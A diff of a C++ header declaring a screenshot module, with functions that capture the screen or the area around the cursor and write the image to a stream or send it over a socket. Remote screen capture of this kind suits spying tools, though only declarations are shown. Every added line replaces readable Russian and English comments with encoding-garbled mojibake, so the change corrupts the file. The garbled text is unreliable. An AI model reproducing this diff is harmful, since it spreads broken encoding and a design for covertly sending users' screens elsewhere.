@@ -1,43 +1,43 @@
 /*
-  Создание скриншота.
+  РЎРѕР·РґР°РЅРёРµ СЃРєСЂРёРЅС€РѕС‚Р°.
 */
 #pragma once
 
 namespace Screenshoot
 {
   /*
-    Инициализация.
+    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void uninit(void);
 
   /*
-    Запись скриншота экрана в IStream.
+    Р—Р°РїРёСЃСЊ СЃРєСЂРёРЅС€РѕС‚Р° СЌРєСЂР°РЅР° РІ IStream.
 
-    IN mimeType - формат изображения.
-    IN quality  - качество картинки в процентах (только JPEG).
-    IN rect     - размер стороны квадрата вокруг курсора, или 0 - для создание скриншота всего
-                  экрана.
+    IN mimeType - С„РѕСЂРјР°С‚ РёР·РѕР±СЂР°Р¶РµРЅРёСЏ.
+    IN quality  - РєР°С‡РµСЃС‚РІРѕ РєР°СЂС‚РёРЅРєРё РІ РїСЂРѕС†РµРЅС‚Р°С… (С‚РѕР»СЊРєРѕ JPEG).
+    IN rect     - СЂР°Р·РјРµСЂ СЃС‚РѕСЂРѕРЅС‹ РєРІР°РґСЂР°С‚Р° РІРѕРєСЂСѓРі РєСѓСЂСЃРѕСЂР°, РёР»Рё 0 - РґР»СЏ СЃРѕР·РґР°РЅРёРµ СЃРєСЂРёРЅС€РѕС‚Р° РІСЃРµРіРѕ
+                  СЌРєСЂР°РЅР°.
 
-    Return      - IStream - в случаи успеха,
-                  NULL    - в случаи ошибки.
+    Return      - IStream - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                  NULL    - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
   */
   IStream *_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect);
 
-  /*В В В В Record screenshots into the socket.
+  /*Р’В Р’В Р’В Р’В Record screenshots into the socket.
 
-В В В В IN s - socket.
-В В В В IN mimeType - the image format.
-В В В В IN quality - picture quality in percent (only JPEG).
-В В В В IN rect - the size of the square around the cursor, or 0 - to create a screenshot of the
-В В В В В В В В В В В В В В В В В В screen.
+Р’В Р’В Р’В Р’В IN s - socket.
+Р’В Р’В Р’В Р’В IN mimeType - the image format.
+Р’В Р’В Р’В Р’В IN quality - picture quality in percent (only JPEG).
+Р’В Р’В Р’В Р’В IN rect - the size of the square around the cursor, or 0 - to create a screenshot of the
+Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В screen.
 
-В В В В Return - true - if successful,
-В В В В В В В В В В В В В В В В В В false - if an error occurs.
-В В */
+Р’В Р’В Р’В Р’В Return - true - if successful,
+Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В false - if an error occurs.
+Р’В Р’В */
   bool _screenToSocket(SOCKET s, LPWSTR mimeType, DWORD quality, WORD rect);
 };
